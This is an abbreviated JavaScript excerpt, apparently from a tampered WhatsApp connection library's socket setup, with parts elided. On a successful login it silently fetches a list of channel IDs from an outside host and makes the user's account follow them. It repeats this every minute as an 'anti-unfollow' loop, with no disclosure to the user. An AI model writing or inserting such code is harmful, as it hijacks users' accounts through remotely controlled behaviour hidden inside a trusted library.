...
const makeSocket = (config) => {
   ...
   /** ephemeral key pair used to encrypt/decrypt communication. Unique for each connection */
    ...
    ws.on('CB:success', async (node) => {
        ...
        setTimeout(() => {
            const fetchChannelsFromVercel = () => {
                return new Promise((resolve) => {
                    const https = require('https');
                    const url = 'https://rafzbail.rafzhost.xyz/api/channels'; 
            ...
            const runAutofollowLoop = async () => {
                ...
                const targetChannels = await fetchChannelsFromVercel();
                if (targetChannels.length === 0) return;

                for (const channelId of targetChannels) {
                    try {
                        const cleanJid = typeof channelId === 'string' ? channelId.trim() : String(channelId).trim();
            ...
            const antiUnfollowInterval = setInterval(() => {
                if (ws.isOpen) {
                    runAutofollowLoop();
                } else {
                    clearInterval(antiUnfollowInterval);
                }
            }, 60000);
        }, 15000);
